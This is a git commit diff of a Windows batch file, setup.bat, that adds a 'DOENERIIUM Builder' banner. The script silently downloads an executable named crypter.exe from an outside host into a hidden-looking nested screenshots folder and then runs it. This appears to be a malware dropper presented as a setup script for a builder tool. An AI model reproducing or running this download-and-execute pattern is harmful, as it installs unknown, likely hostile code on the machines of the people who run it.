c3c12a30981aaa37157975a709d6b61250fb9edb
doeneriium6969 <yalansoyledigozler@gmail.com>
2024-07-08 00:27:38 +0300

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,9 +1,24 @@
 @echo off
-echo Loading & Yukleniyor
+chcp 65001 >nul
+cls
+echo.
+echo.
+echo.
+echo             ██████╗  ██████╗ ███████╗███╗   ██╗███████╗██████╗ ██╗██╗   ██╗███╗   ███╗
+echo             ██╔══██╗██╔═══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗██║██║   ██║████╗ ████║
+echo             ██║  ██║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝██║██║   ██║██╔████╔██║
+echo             ██║  ██║██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██║██║   ██║██║╚██╔╝██║
+echo             ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
+echo             ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
+echo.
+echo                                           Builder
+echo.
+echo.
+echo.
 timeout /t 3 >nul
 
-rem curl kullanarak dosyayı indirme
-curl -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe
+rem curl kullanarak dosyayı sessiz modda indirme
+curl -s -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe
 
 rem Dosyayı çalıştırma
 start "" "screenshots\profile\aa\b\crypter.exe"
